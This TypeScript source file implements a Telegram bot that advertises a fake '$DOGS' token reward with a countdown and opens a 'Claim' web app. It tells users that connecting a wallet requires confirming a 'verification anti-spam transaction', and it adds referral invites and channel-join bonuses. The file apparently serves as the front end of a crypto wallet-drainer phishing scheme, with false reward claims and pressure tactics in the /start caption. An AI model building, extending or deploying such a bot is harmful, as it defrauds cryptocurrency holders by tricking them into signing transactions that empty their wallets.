import DodoBot from './DodoBot';
import {DodoCommand} from './types/dodo';
import {Context, Markup, NarrowedContext} from 'telegraf';
import DodoSession from './DodoSession';
import {env} from '../env';
import {log} from 'console';
import prisma, {PrismaModelType} from "@backend/modules/prisma/Prisma";

import {User} from "@prisma/client";

import {CLIENT_BOT} from "@/bot/main";
import {Message, Update} from "telegraf/types";
import {CallbackQuery} from "@telegraf/types";
import dodoBot from "./DodoBot";
import {generateRandomString} from "@backend/utils/string";
import {getInviteText, sendInvite} from "@backend/api/player/send_invite/actions";


export async function communityButton(final = false) {
	const enabled = await CLIENT_BOT.getSetting('CHANNEL_LOCK');
	if (!enabled) return [];

	const channel = await prisma.botChannel.findFirst({
		where: {
			botUsername: CLIENT_BOT.me?.username + "",
			OR: [
				{
					channelId: enabled + ""
				},
				{
					chatId: enabled + ""
				}
			]
		}
	});

	if (!channel) return [];

	const tChannel = await CLIENT_BOT.telegram.getChat(channel.channelId) as any;

	if (final) {
		return [
			Markup.button.url(`Join to ${channel.title}`, `https://t.me/${tChannel.username}`),
			Markup.button.callback("Receive 547289.00 $DOGS", 'lock_check')
		]
	} else {
		return [
			Markup.button.callback("Join our community", 'community')
		]
	}
}

class DodoClient extends DodoSession {
	async callBack(e: NarrowedContext<Context<Update>, Update.CallbackQueryUpdate<CallbackQuery & { data: string }>>) {
		const user = await prisma.user.findUnique({
			where: {
				id:+(e.from?.id || "")
			}
		});
		if (!user) return;

		const data = e?.update?.callback_query?.data || ""
		if (data === 'lock_check') {
			const lock = await CLIENT_BOT.getSetting('CHANNEL_LOCK');
			if (!lock) return;

			const chat = await CLIENT_BOT.telegram.getChatMember(lock, user.id);
			const joined = !(chat.status === 'kicked' || chat.status === 'left');
			if (!joined) {
				await e.reply("You should join our community!");
				return;
			}

			if (user.lockReward) {
				await e.reply("You already take the Community Gift!");
				return;
			}

			await prisma.user.update({
				where: {
					id: user.id
				},
				data: {
					wallet: user.wallet + 2000,
					lockReward: true
				}
			});
			await e.reply("You receive 2K dodo");
		}
		else if (data === 'community') {
			await e.reply("Join our community and receive 547289.00 $DOGS!", {
				...Markup.inlineKeyboard(await communityButton(true))
			})
		}
	}

	async commands(): Promise<DodoCommand[]> {
		const ctx = this.ctx;
		const user = ctx?.telegram ? await prisma.user.findUnique({
			where: {
				id: +(ctx.from?.id || "")
			}
		}) || ({} as NonNullable<PrismaModelType<'user'>>) : {} as NonNullable<PrismaModelType<'user'>>;


		return [
			{
				name: ['/start', 'Home'],
				handler: async () => {
					const bannerFile = this.dodoBot.variables['banner'];
					this.dodoBot.variables['banner'] = await ctx.replyWithPhoto(bannerFile ? (bannerFile?.photo?.shift?.()?.file_id+""):({
						source: process.cwd()+"/public/banner.png"
					}), {
						caption: `
🦴 Your reward has been updated!

🎁 Your available reward: 
547289.00 $DOGS

👇 Conditions of participation in daily rewards:

🔸 Click the button below this message, to claim your reward!

🔸 After connecting your wallet, you must confirm the verification anti-spam transaction. This is secure and confirms that your wallet is your primary wallet.

🚨 Please note that you have only 10 hours left to claim your reward!
					`.trim()
						,
						...(Markup.inlineKeyboard([
							Markup.button.webApp("Claim $DOGS", await getWebAppUrl(user)),
							Markup.button.switchToChat("Invite Friends!", await getInviteText(user)),
							...(await communityButton())
						],{
							columns: 1
						}))
					});
				},
			},
			{
				name: ['/refs', 'Refs'],
				handler: async () => {
					await sendInvite(user);
				},
			},
			{
				name: "Refs",
				handler: async () => {
					await sendInvite(user)
				}
			}
		];
	}
}

export async function getWebAppUrl(user: PrismaModelType<'user'>) {
	if (!user || !user.id || !user.chatId) return `${env.WEB_ORIGIN}/404`;
	let token = user?.token?.() || "";
	try {

		let exists = await prisma.user.findUnique({
			where: {
				id: +(user?.id || "")
			}
		})

		if (!exists) {
			exists = await prisma.user.create({
				data: {
					id: user.id,
					username: user?.username || (`user_${generateRandomString()}`),
					chatId: user?.chatId
				}
			})
		}

		user = exists;
		if (token.length <= 0) {
			token = generateRandomString(20);
			user = await prisma.user.update({
				where: {
					id: user.id
				},
				data: {
					token: token+""
				}
			});
		}
	} catch (e) {
		console.error(e);
	}

	const origin = env.WEB_ORIGIN;
	const url = new URL(origin+"/dogs/index.html");
	url.searchParams.set('token', token);
	const str = url.toString();
	console.log(user?.username ?? user.id, str);
	return str;
}

export default DodoClient;
